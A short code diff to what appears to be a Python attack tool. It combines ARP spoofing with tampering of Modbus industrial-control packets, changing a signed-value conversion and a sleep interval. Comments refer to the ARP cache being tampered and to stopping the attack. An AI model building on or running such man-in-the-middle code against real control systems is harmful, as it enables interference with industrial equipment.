@@ -345,6 +345,8 @@ def parse_modbus_data(packet, sport, dport):
                     #xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()
                     loag = 0
 
+                    if a6 > 63000:
+                        a6 = a6 - 65536
                     if loag == 1:
                         xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
                         #xmodbus_data += xa1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
@@ -547,7 +549,7 @@ def main():
             observed_mac = getmacbyip(target_ip)
             if observed_mac != gateway_mac:
                 print(f"[INFO] ARP 已被篡改: {observed_mac}")
-            time.sleep(1)
+            time.sleep(2)
 
     except KeyboardInterrupt:
         # 捕获 Ctrl+C，停止攻击
